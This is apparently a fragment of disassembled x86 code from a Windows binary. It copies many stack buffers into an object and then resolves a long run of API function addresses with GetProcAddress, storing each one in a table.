lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x16c ]
push ecx
lea edx [ esi + 0x2520 ]
push edx
call sub_10078600
lea eax [ ebp - 0x96c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x96c ]
push eax
lea ecx [ esi + 0x2628 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xda0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xda0 ]
push edx
lea eax [ esi + 0x2730 ]
push eax
call sub_10078600
lea eax [ ebp - 0x490 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x490 ]
push ecx
lea edx [ esi + 0x2838 ]
push edx
call sub_10078600
lea eax [ ebp - 0x3f0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x3f0 ]
push eax
lea ecx [ esi + 0x2940 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x864 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x864 ]
push edx
lea eax [ esi + 0x2a48 ]
push eax
call sub_10078600
lea eax [ ebp - 0x5e4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x5e4 ]
push ecx
lea edx [ esi + 0x2b50 ]
push edx
call sub_10078600
lea eax [ ebp - 0x4f0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x4f0 ]
push eax
lea ecx [ esi + 0x2c58 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xa5c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xa5c ]
push edx
lea eax [ esi + 0x2d60 ]
push eax
call sub_10078600
lea eax [ ebp - 0x78 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x78 ]
push ecx
lea edx [ esi + 0x2e68 ]
push edx
call sub_10078600
lea eax [ ebp - 0x118 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ esi + 0x2f70 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xb04 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xb04 ]
push edx
lea eax [ esi + 0x3078 ]
push eax
call sub_10078600
lea eax [ ebp - 0x48 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ esi + 0x3180 ]
push edx
call sub_10078600
lea eax [ ebp - 0x1dc ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x1dc ]
push eax
lea ecx [ esi + 0x3288 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x330 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x330 ]
push edx
lea eax [ esi + 0x3390 ]
push eax
call sub_10078600
lea eax [ ebp - 0x2bc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x2bc ]
push ecx
lea edx [ esi + 0x3498 ]
push edx
call sub_10078600
lea eax [ ebp - 0x554 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x554 ]
push eax
lea ecx [ esi + 0x35a0 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xad8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xad8 ]
push edx
lea eax [ esi + 0x36a8 ]
push eax
call sub_10078600
lea eax [ ebp - 0xc4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
lea edx [ esi + 0x37b0 ]
push edx
call sub_10078600
lea eax [ ebp - 0x674 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x674 ]
push eax
lea ecx [ esi + 0x38b8 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x150 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x150 ]
push edx
lea eax [ esi + 0x39c0 ]
push eax
call sub_10078600
lea eax [ ebp - 0x390 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x390 ]
push ecx
lea edx [ esi + 0x3ac8 ]
push edx
call sub_10078600
lea eax [ ebp - 0x350 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x350 ]
push eax
lea ecx [ esi + 0x3bd0 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xc98 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xc98 ]
push edx
lea eax [ esi + 0x3cd8 ]
push eax
call sub_10078600
lea eax [ ebp - 0xcf8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xcf8 ]
push ecx
lea edx [ esi + 0x3de0 ]
push edx
call sub_10078600
lea eax [ ebp - 0x430 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x430 ]
push eax
lea ecx [ esi + 0x3ee8 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xd68 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xd68 ]
push edx
lea eax [ esi + 0x3ff0 ]
push eax
call sub_10078600
lea eax [ ebp - 0x284 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x284 ]
push ecx
lea edx [ esi + 0x40f8 ]
push edx
call sub_10078600
lea eax [ ebp - 0x578 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x578 ]
push eax
lea ecx [ esi + 0x4200 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x230 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x230 ]
push edx
lea eax [ esi + 0x4308 ]
push eax
call sub_10078600
lea eax [ ebp - 0x5c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x5c0 ]
push ecx
lea edx [ esi + 0x4410 ]
push edx
call sub_10078600
lea eax [ ebp - 0x6b4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x6b4 ]
push eax
lea ecx [ esi + 0x4518 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x1c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x1c0 ]
push edx
lea eax [ esi + 0x4620 ]
push eax
call sub_10078600
lea eax [ ebp - 0xb88 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xb88 ]
push ecx
lea edx [ esi + 0x4728 ]
push edx
call sub_10078600
lea eax [ ebp - 0xa84 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xa84 ]
push eax
lea ecx [ esi + 0x4830 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xbe0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xbe0 ]
push edx
lea eax [ esi + 0x4938 ]
push eax
call sub_10078600
lea eax [ ebp - 0x1f8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x1f8 ]
push ecx
lea edx [ esi + 0x4a40 ]
push edx
call sub_10078600
lea eax [ ebp - 0x450 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x450 ]
push eax
lea ecx [ esi + 0x4b48 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x7d4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x7d4 ]
push edx
lea eax [ esi + 0x4c50 ]
push eax
call sub_10078600
lea eax [ ebp - 0x8ac ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x8ac ]
push ecx
lea edx [ esi + 0x4d58 ]
push edx
call sub_10078600
lea eax [ ebp - 0x1a4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x1a4 ]
push eax
lea ecx [ esi + 0x4e60 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x4b0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x4b0 ]
push edx
lea eax [ esi + 0x4f68 ]
push eax
call sub_10078600
lea eax [ ebp - 0xc38 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xc38 ]
push ecx
lea edx [ esi + 0x5070 ]
push edx
call sub_10078600
lea eax [ ebp - 0x510 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x510 ]
push eax
lea ecx [ esi + 0x5178 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x214 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x214 ]
push edx
lea eax [ esi + 0x5280 ]
push eax
call sub_10078600
lea eax [ ebp - 0x2d8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x2d8 ]
push ecx
lea edx [ esi + 0x5388 ]
push edx
call sub_10078600
lea eax [ ebp - 0x8f4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x8f4 ]
push eax
lea ecx [ esi + 0x5490 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xe0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xe0 ]
push edx
lea eax [ esi + 0x5598 ]
push eax
call sub_10078600
lea eax [ ebp - 0x370 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x370 ]
push ecx
lea edx [ esi + 0x56a0 ]
push edx
call sub_10078600
lea eax [ ebp - 0x24c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x24c ]
push eax
lea ecx [ esi + 0x57a8 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x530 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x530 ]
push edx
lea eax [ esi + 0x58b0 ]
push eax
call sub_10078600
lea eax [ ebp - 0x470 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x470 ]
push ecx
lea edx [ esi + 0x59b8 ]
push edx
call sub_10078600
lea eax [ ebp - 0x3b0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x3b0 ]
push eax
lea ecx [ esi + 0x5ac0 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x78c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x78c ]
push edx
lea eax [ esi + 0x5bc8 ]
push eax
call sub_10078600
lea eax [ ebp - 0x2a0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x2a0 ]
push ecx
lea edx [ esi + 0x5cd0 ]
push edx
call sub_10078600
lea eax [ ebp - 0xfc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xfc ]
push eax
lea ecx [ esi + 0x5dd8 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xa8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xa8 ]
push edx
lea eax [ esi + 0x5ee0 ]
push eax
call sub_10078600
lea eax [ ebp - 0x744 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x744 ]
push ecx
lea edx [ esi + 0x5fe8 ]
push edx
call sub_10078600
lea eax [ ebp - 0x768 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x768 ]
push eax
lea ecx [ esi + 0x60f0 ]
push ecx
call sub_10078600
lea eax [ ebp - 0xbb4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xbb4 ]
push edx
lea eax [ esi + 0x61f8 ]
push eax
call sub_10078600
lea eax [ ebp - 0x6d8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x6d8 ]
push ecx
lea edx [ esi + 0x6300 ]
push edx
call sub_10078600
lea eax [ ebp - 0x6fc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x6fc ]
push eax
lea ecx [ esi + 0x6408 ]
push ecx
call sub_10078600
lea eax [ ebp - 0x134 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x134 ]
push edx
lea eax [ esi + 0x6510 ]
push eax
call sub_10078600
lea eax [ ebp - 0xaac ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xaac ]
push ecx
add esi 0x6618
push esi
call sub_10078600
mov eax [ rw-data ]
mov esi [ GetProcAddress@IAT ]
add esp 0xc
lea edx [ ebp - 0x310 ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x944 ]
mov [ ecx + 0x104 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x60 ]
mov [ ecx + 0x20c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x90 ]
mov [ ecx + 0x314 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x268 ]
mov [ ecx + 0x41c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x62c ]
mov [ ecx + 0x524 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x81c ]
mov [ ecx + 0x62c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8d0 ]
mov [ ecx + 0x734 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3d0 ]
mov [ ecx + 0x83c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x91c ]
mov [ ecx + 0x944 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0xa4c ] eax
lea edx [ ebp - 0xc0c ]
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x59c ]
mov [ ecx + 0xb54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb5c ]
mov [ ecx + 0xc5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc68 ]
mov [ ecx + 0xd64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x9bc ]
mov [ ecx + 0xe6c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x9e4 ]
mov [ ecx + 0xf74 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x608 ]
mov [ ecx + 0x107c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7f8 ]
mov [ ecx + 0x1184 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa34 ]
mov [ ecx + 0x128c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7b0 ]
mov [ ecx + 0x1394 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x888 ]
mov [ ecx + 0x149c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2f4 ]
mov [ ecx + 0x15a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x994 ]
mov [ ecx + 0x16ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x720 ]
mov [ ecx + 0x17b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xdd8 ]
mov [ ecx + 0x18bc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb30 ]
mov [ ecx + 0x19c4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4d0 ]
mov [ ecx + 0x1acc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xcc8 ]
mov [ ecx + 0x1bd4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x650 ]
mov [ ecx + 0x1cdc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x18 ]
mov [ ecx + 0x1de4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xd30 ]
mov [ ecx + 0x1eec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x410 ]
mov [ ecx + 0x1ff4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x188 ]
mov [ ecx + 0x20fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x840 ]
mov [ ecx + 0x2204 ] eax
push edx
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x30 ]
mov [ ecx + 0x230c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa0c ]
mov [ ecx + 0x2414 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x16c ]
mov [ ecx + 0x251c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x96c ]
mov [ ecx + 0x2624 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xda0 ]
mov [ ecx + 0x272c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x490 ]
mov [ ecx + 0x2834 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3f0 ]
mov [ ecx + 0x293c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x864 ]
mov [ ecx + 0x2a44 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5e4 ]
mov [ ecx + 0x2b4c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4f0 ]
mov [ ecx + 0x2c54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa5c ]
mov [ ecx + 0x2d5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x78 ]
mov [ ecx + 0x2e64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x118 ]
mov [ ecx + 0x2f6c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb04 ]
mov [ ecx + 0x3074 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x48 ]
mov [ ecx + 0x317c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1dc ]
mov [ ecx + 0x3284 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x330 ]
mov [ ecx + 0x338c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2bc ]
mov [ ecx + 0x3494 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x554 ]
mov [ ecx + 0x359c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xad8 ]
mov [ ecx + 0x36a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc4 ]
mov [ ecx + 0x37ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x674 ]
mov [ ecx + 0x38b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x150 ]
mov [ ecx + 0x39bc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x390 ]
mov [ ecx + 0x3ac4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x350 ]
mov [ ecx + 0x3bcc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc98 ]
mov [ ecx + 0x3cd4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xcf8 ]
mov [ ecx + 0x3ddc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x430 ]
mov [ ecx + 0x3ee4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xd68 ]
mov [ ecx + 0x3fec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x284 ]
mov [ ecx + 0x40f4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x578 ]
mov [ ecx + 0x41fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
